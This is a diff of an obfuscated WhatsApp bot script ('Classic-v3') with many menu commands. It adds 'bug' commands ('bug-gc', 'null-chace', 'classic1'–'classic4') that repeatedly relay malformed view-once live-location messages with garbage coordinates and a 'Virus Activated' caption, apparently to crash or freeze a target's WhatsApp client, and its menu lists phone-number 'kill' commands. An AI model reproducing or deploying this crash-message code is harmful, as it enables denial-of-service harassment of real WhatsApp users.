_0xcddc(_0x48f8e4,_0x3b94ab){const _0x4ffdb7=_0x4ffd();return _0xcddc=function(_0xcddcc2,_0x2798bc){_0xcddcc2=_0xcddcc2-0x155;let _0x2826c1=_0x4ffdb7[_0xcddcc2];return _0x2826c1;},_0xcddc(_0x48f8e4,_0x3b94ab);}(function(_0x17753b,_0x4c6cc9){const _0x1df333=_0xcddc,_0xde6f3=_0x17753b();while(!![]){try{const _0x5bc1ac=parseInt(_0x1df333(0x169))/0x1*(-parseInt(_0x1df333(0x17a))/0x2)+-parseInt(_0x1df333(0x157))/0x3*(parseInt(_0x1df333(0x172))/0x4)+parseInt(_0x1df333(0x166))/0x5*(-parseInt(_0x1df333(0x17b))/0x6)+parseInt(_0x1df333(0x17d))/0x7*(parseInt(_0x1df333(0x16f))/0x8)+-parseInt(_0x1df333(0x167))/0x9+-parseInt(_0x1df333(0x163))/0xa+parseInt(_0x1df333(0x155))/0xb;if(_0x5bc1ac===_0x4c6cc9)break;else _0xde6f3['push'](_0xde6f3['shift']());}catch(_0x4c2e5b){_0xde6f3['push'](_0xde6f3['shift']());}}}(_0x4ffd,0xce230));try{let msg=generateWAMessageFromContent(m[_0x3f139f(0x160)]['remoteJid'],{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadata':{},'deviceListMetadataVersion':0x2},'interactiveMessage':proto['Message']['InteractiveMessage']['create']({'body':proto[_0x3f139f(0x173)][_0x3f139f(0x17c)][_0x3f139f(0x177)][_0x3f139f(0x174)]({'text':'Click\x20Me\x20🚀'}),'footer':proto[_0x3f139f(0x173)][_0x3f139f(0x17c)][_0x3f139f(0x15a)][_0x3f139f(0x174)]({'text':_0x3f139f(0x16a)}),'header':proto[_0x3f139f(0x173)][_0x3f139f(0x17c)][_0x3f139f(0x15c)][_0x3f139f(0x174)]({...await prepareWAMessageMedia({'image':{'url':_0x3f139f(0x178)}},{'upload':zetsubo['waUploadToServer']}),'title':'','subtitle':'Classic-v3-BUG','hasMediaAttachment':![]}),'nativeFlowMessage':proto[_0x3f139f(0x173)][_0x3f139f(0x17c)][_0x3f139f(0x165)][_0x3f139f(0x174)]({'buttons':[{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x168)+prefix+_0x3f139f(0x16b)},{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x159)+prefix+'bugmenu\x22}'},{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x16e)+prefix+_0x3f139f(0x176)},{'name':'quick_reply','buttonParamsJson':'{\x22display_text\x22:\x22RANDOMMENU\x20🙋\x22,\x22id\x22:\x22'+prefix+'randommenu\x22}'},{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x164)+prefix+'gamemenu\x22}'},{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x15f)+prefix+_0x3f139f(0x15d)},{'name':_0x3f139f(0x16d),'buttonParamsJson':'{\x22display_text\x22:\x22Listmusik\x20🎉\x22,\x22id\x22:\x22'+prefix+_0x3f139f(0x15e)},{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x179)+prefix+_0x3f139f(0x16c)},{'name':'quick_reply','buttonParamsJson':'{\x22display_text\x22:\x22Pushmenu\x20👁️\x22,\x22id\x22:\x22'+prefix+'pushmenu\x22}'},{'name':_0x3f139f(0x16d),'buttonParamsJson':_0x3f139f(0x161)+prefix+_0x3f139f(0x158)}]})})}}},{});if(!msg||!msg[_0x3f139f(0x160)]||!msg[_0x3f139f(0x160)][_0x3f139f(0x171)]||!msg[_0x3f139f(0x160)]['id']){const errorMessage=_0x3f139f(0x17e);return console[_0x3f139f(0x156)](errorMessage),reply(errorMessage);}await zetsubo[_0x3f139f(0x15b)](msg[_0x3f139f(0x160)][_0x3f139f(0x171)],msg[_0x3f139f(0x170)],{'messageId':msg[_0x3f139f(0x160)]['id']});}catch(_0x3e0ad4){return console[_0x3f139f(0x156)](_0x3f139f(0x175),_0x3e0ad4),reply(_0x3f139f(0x162));} 
 }
 break
 //=================================================//
 case 'bugmenu': {
-await inireact()
+	
                             ewe = ` *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* 
                             
   
@@ -1263,7 +1001,7 @@ await inireact()
 ┃➢ 𝐜-𝐤𝐢𝐥𝐥 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
 ┃➢ 𝐛𝐮𝐫𝐠𝐚𝐢𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
 ┃➢ 𝐒𝐥𝐞𝐞𝐩𝐲 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
-┃➢ 𝐞𝐯𝐢𝐥-𝐬𝐚𝐦
+┃➢ 𝐞𝐯𝐢𝐥-𝐬𝐚
 ┃➢ 𝐛𝐮𝐠𝐥𝐢𝐬𝐭
 ┗━━━━━━━━━━━━━━━━━━
 
@@ -1273,7 +1011,7 @@ await inireact()
 let hiks = {
 image: cewegw, 
   caption: ewe,
-  contextInfo:{externalAdReply:{
+  contextInfom:{externalAdReply:{
   title: 'ᚙᚘ ⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 ⧉⸙⫺   - 𝐊ᚗ𝐈𝐍ᚗ𝐆 ᚘᚙ',
   body: 'ᚙᚘ ⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⸙⫺᚜𝐌𝐈𝐒𝐒𝐈𝐎𝐍᚛ ᚘᚙ', 
   showAdAttribution: true,
@@ -1286,7 +1024,7 @@ image: cewegw,
 zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 case 'pushmenu': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1343,7 +1081,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'groupmenu': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1425,7 +1163,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'downloadmenu': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1487,7 +1225,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'randommenu': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1582,7 +1320,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'Islammenu': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1637,7 +1375,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'textmaker': {
-await inireact()
+
                             ewe = `┏━━━❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3* ❱━━━━━━ 
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1720,7 +1458,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'listmusik': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -1932,7 +1670,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'addmenu': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -2009,7 +1747,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'cucimata': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -2176,7 +1914,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'asupan': {
-await inireact()
+
                             ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
 ┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
 ┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
@@ -2247,7 +1985,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'funmenu':
-await inireact()
+
 if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}`
 sendGeekzMessage(from, { 
@@ -2747,7 +2485,7 @@ await zetsubo.groupParticipantsUpdate(from, [users], 'promote')
 break
 //=================================================//
 case 'demote': {
-await inireact()
+
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2848,7 +2586,6 @@ if (!m.isGroup) return reply('Make it in the Stupid Group')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
 if (!isAdmins) return reply('Considered Admin Group')
 if (!text) throw 'Text Nya ?'
-await inireact()
 await zetsubo.groupUpdateDescription(from, text).then((res)).catch((err) => reply(jsonformat(err)))
 }
 break
@@ -2954,53 +2691,65 @@ zetsubo.sendFile(from, pp, "", m, { caption: tekse, mentions: await zetsubo.pars
 }
 break
 //=================================================
-case 'bugggg': {
-await inireact()
-if (isBan) return reply('*Lu Di Ban Owner*')
-joauuuuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
-zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
+case 'plerku': case 'bug-gc': {
+if (! isCreator) return reply(mess.premium)
+if (!m.isGroup) return m.reply('Only In Group')
+if (!q) return joreply(`use .${command} 1`)
+for (let j = 0; j < q; j++) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️᜴࿆͆᷍Classic̿╮⭑ ☠️⃰͜͡؜Virus⃟⭐️᜴▴Activatedཀ͜͡✅⃟╮.xp`,
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: force })
+await zetsubo.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
+}
+await reply('💊𝗧𝗮𝗿𝗴𝗲𝘁 𝗘𝗹𝗶𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗯𝘆 Classic 📡')
 }
 break
 //=================================================
-case "welcome":
-await inireact()
-{
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Make it in the Stupid Group')
-await inireact()
-if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
-if (args[0] === "on") {
-if (welcm) return reply('Sudah Aktif')
-wlcm.push(from)
-var groupe = await zetsubo.groupMetadata(from)
-var members = groupe['participants']
-var mems = []
-members.map(async adm => {
-mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+case 'null-chace': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Use .${command} 1`)
+for (let j = 0; j < q; j++) {
+ngeloc(m.chat, force)
+}
+await reply('✅Succes')
+}
+break
+//=================================================
+case 'classic1': case 'classic2': case 'classic3': case 'classic4': {
+if (m.isGroup) return reply("Only In Private Chat")
+if (!isCreator) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await zetsubo.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: ``,
+title: `𝕾𝖔𝖗𝖗𝖞 𝕭𝖗𝖔 𝕴 𝖌𝖔𝖙 𝕹𝖔 𝖒𝖊𝖗𝖈𝖞 𝖔𝖓 𝖞𝖔𝖚 🥵🙃`,
+body: `⁗ Classic 𝕰𝖑𝖎𝖒𝖎𝖓𝖆𝖙𝖊𝖘 📡`,
+previewType: "VIDEO",
+sourceUrl: `Classic 𝕾𝖚𝖈𝖐𝖘`,
+mediaType: 1,
+mediaUrl: `${global.url}`
+}
+},
+text: '📡𝗬𝗼𝘂 𝗖𝗮𝗻 𝗖𝗼𝗽𝘆 𝗕𝘂𝘁 𝗬𝗼𝘂 𝗖𝗮𝗻𝘁 𝗯𝗲 𝗠𝗲 🙃 𝗖𝗮𝗹𝗹 𝗠𝗲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 🩸'
+}, {
+quoted: m
 })
-zetsubo.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
-} else if (args[0] === "off") {
-if (!welcm) return reply('Sudah Non Aktif')
-let off = wlcm.indexOf(from)
-wlcm.splice(off, 1)
-reply('Sukses Mematikan Welcome  di group ini')
-}
-}
-break
-//=================================================
-case 'bcgc': case 'bcgroup': {
-if (!isCreator) return reply('*Premium Only*')
-await inireact()
-if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
-let getGroups = await zetsubo.groupFetchAllParticipating()
-let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
-let anu = groups.map(v => v.id)
-reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
-for (let i of anu) {
-await sleep(1500)
-zetsubo.sendMessage(i, {text: `${text}`}, {quoted:m})
-    }
-reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 }
 break
 //=================================================//
@@ -3258,7 +3007,6 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================// 
 case 'ping': {
-await inireact()
   const startTime = new Date();
   const pingMsg = await zetsubo.sendMessage(m.chat, { text: '*Classifying*' });
 
@@ -3584,61 +3332,25 @@ zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m}
 }
 break
 //=================================================
-case 'rentbot':
-                reply(`Type ${prefix}owner and chat him`)
-                break
-            case 'speedtest': {
-                zetsubo('Testing Speed...')
-                let cp = require('child_process')
-                let {
-                    promisify
-                } = require('util')
-                let exec = promisify(cp.exec).bind(cp)
-                let o
-                try {
-                    o = await exec('python speed.py')
-                } catch (e) {
-                    o = e
-                } finally {
-                    let {
-                        stdout,
-                        stderr
-                    } = o
-                    if (stdout.trim()) zetsubo.sendMessage(m.chat, {
-                        text: stdout,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnailUrl: 'https://ibb.co/VVLfc0Q/cheemspic.jpg',
-                                sourceUrl: wagc,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                    if (stderr.trim()) zetsubo.sendMessage(m.chat, {
-                        text: stderr,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnailUrl: 'https://ibb.co/VVLfc0Q/cheemspic.jpg',
-                                sourceUrl: wagc,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                }
-            }
-            break
+case'telestick': {
+if (!isCreator) return reply(mess.owner)
+inireact()
+if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
+let xeonresources = await Telesticker(args[0])
+await reply(`Sending ${xeonresources.length} stickers...`)
+if (m.isGroup && xeonresources.length > 30) {
+await reply('Number of stickers more than 30, bot will send it in private chat.')
+for (let i = 0; i < xeonresources.length; i++) {
+zetsubo.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
+}
+} else {
+for (let i = 0; i < xeonresources.length; i++) {
+zetsubo.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
+}
+}
+} else reply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
+}
+break
 //=================================================
 case 'autostatusview':
                 if (!isCreator) return reply(`Successfully changed auto status/story view`)
@@ -4651,7 +4363,7 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     repo = repo.replace(/.git$/, '')
     let url = `https://api.github.com/repos/${user}/${repo}/zipball`
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
-    zetsubo.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
+    zetsubo.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
 break
 //=================================================//
 case 'sifat': case 'karakter': {
@@ -4696,7 +4408,6 @@ https://cloud.google.com/translate/docs/languages
 //=================================================//
 case 'play':
     case 'music': {
-	 await inireact()
         if (!text) {
             reply('𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐬𝐞𝐚𝐫𝐜𝐡 𝐭𝐞𝐫𝐦!\n𝐄.𝐠: 𝙷𝙴𝙰𝙳𝙻𝙸𝙶𝙷𝚃𝚂 𝙱𝚈 𝙰𝙻𝙰𝙽 𝚆𝙰𝙻𝙺𝙴𝚁')
             return;
